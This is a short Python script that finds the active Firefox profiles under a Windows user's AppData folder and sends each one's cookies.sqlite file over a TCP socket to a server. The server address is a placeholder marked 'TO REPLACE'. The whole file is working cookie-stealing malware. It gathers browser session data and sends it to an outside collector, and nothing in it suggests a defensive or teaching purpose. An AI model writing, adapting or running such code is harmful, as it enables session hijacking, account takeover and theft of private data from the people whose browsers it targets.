import socket
import os

APPDATA_PATH = os.getenv('APPDATA')
FIREFOX_PROFILE_FOLDER = APPDATA_PATH + r"\Mozilla\Firefox\Profiles"

def send_file(filename, server_address, server_port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((server_address, server_port))

        client_socket.send(filename.encode())

        with open(filename, 'rb') as f:
            while True:
                data = f.read(1024)
                if not data:
                    break
                if client_socket.send(data) == 0:
                    print("File send failed...")

        print("File {} sent successfully.".format(filename))

def main():
    server_address = '127.0.0.1'  # TO REPLACE
    server_port = 4242

    profile_folder = os.listdir(FIREFOX_PROFILE_FOLDER)
    for profile in profile_folder:
        profile_path = fr"{FIREFOX_PROFILE_FOLDER}\{profile}"
        files = os.listdir(profile_path)
        if len(files) <= 1:
            continue # folder is not active profile
        send_file(fr"{profile_path}\cookies.sqlite", server_address, server_port)

if __name__ == "__main__":
    main()
